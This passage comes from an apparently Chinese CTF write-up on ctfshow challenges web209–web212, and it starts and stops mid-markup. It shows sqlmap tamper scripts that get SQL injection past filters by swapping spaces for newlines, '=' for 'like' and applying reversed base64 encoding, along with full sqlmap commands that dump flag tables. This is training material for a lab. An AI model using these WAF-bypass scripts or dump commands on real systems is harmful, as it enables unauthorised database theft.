data-num="10"></td><td><pre>__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>    retVal <span class="token operator">=</span> payload</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"COUNT(*)"</span><span class="token punctuation">,</span><span class="token string">"COUNT(id)"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"like"</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">return</span> retVal</pre></td></tr></table></figure><p>tamper 脚本 2</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：web209_2.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/29 17:54  </span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>    retVal <span class="token operator">=</span> payload</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        retVal <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                    <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote</pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote</pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>                <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"like"</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>                <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>                <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">return</span> retVal</pre></td></tr></table></figure><p>payload</p>
<pre><code class="language-c++">sqlmap -u http://cf034c29-3c33-4022-aa72-44bb2b88728a.challenge.ctf.show/api/index.php --safe-url=http://cf034c29-3c33-4022-aa72-44bb2b88728a.challenge.ctf.show/api/getToken.php --safe-freq=1 --data=&quot;id=1&quot; --tamper=web209_2 --dbms=mysql --method=PUT --headers=&quot;Content-Type: text/plain&quot; --level=3 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump --threads=10
</code></pre>
<h4 id="web210-sqlmap-tamper使用"><a class="anchor" href="#web210-sqlmap-tamper使用">#</a> web210 sqlmap tamper 使用</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">//--tamper 的 4 体验</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 0,1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对查询字符进行解密</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>tamper 脚本 1</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：web210.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/29 11:40 </span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="9"></td><td><pre>__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	retVal <span class="token operator">=</span> payload</pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token keyword">if</span> payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token keyword">return</span> retVal</pre></td></tr></table></figure><p>tamper 脚本 2</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：web210_2.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/29 13:39 </span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="11"></td><td><pre>__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">return</span> payload</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">def</span> <span class="token function">strrev</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">return</span> payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    retVal <span class="token operator">=</span> payload</pre></td></tr><tr><td data-num="22"></td><td><pre>    retVal <span class="token operator">=</span> strrev<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    retVal <span class="token operator">=</span> strrev<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">return</span> retVal</pre></td></tr></table></figure><p>payload</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token operator">:</span><span class="token comment">//205ad70c-87f9-473e-9c1c-2bf10138bcc7.challenge.ctf.show/api/index.php --safe-url=http://205ad70c-87f9-473e-9c1c-2bf10138bcc7.challenge.ctf.show/api/getToken.php --safe-freq=1 --data="id=1" --tamper=web210_2 --dbms=mysql --method=PUT --headers="Content-Type: text/plain" --level=3 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump</span></pre></td></tr></table></figure><h4 id="web211-sqlmap的-tamper使用"><a class="anchor" href="#web211-sqlmap的-tamper使用">#</a> web211 sqlmap 的 tamper 使用</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">//--tamper 的 5 体验</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 0,1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// 对查询字符进行解密</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>tamper 脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：web211.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/29 13:28 </span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    retVal <span class="token operator">=</span> payload</pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token keyword">return</span> retVal</pre></td></tr></table></figure><p>payload</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//e4cdb655-ef64-4bff-ab2c-7ae2d9bda186.challenge.ctf.show/api/index.php --safe-url=http://e4cdb655-ef64-4bff-ab2c-7ae2d9bda186.challenge.ctf.show/api/getToken.php --safe-freq=1 --data="id=1" --tamper=web211 --dbms=mysql --method=PUT --headers="Content-Type: text/plain" --level=3 -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump</span></pre></td></tr></table></figure><h4 id="web212-sqlmap的-tamper使用"><a class="anchor" href="#web212-sqlmap的-tamper使用">#</a> web212 sqlmap 的 tamper 使用</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">//--tamper 的 6 体验</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 0,1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// 对查询字符进行解密</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>tamper 脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：web212.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/29 16:19 </span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="11"></td><td><pre>__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">return</span> payload</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">def</span> <span class="token function">strrev</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">return</span> payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    retVal <span class="token operator">=</span> payload</pre></td></tr><tr><td data-num="22"></td><td><pre>    retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span 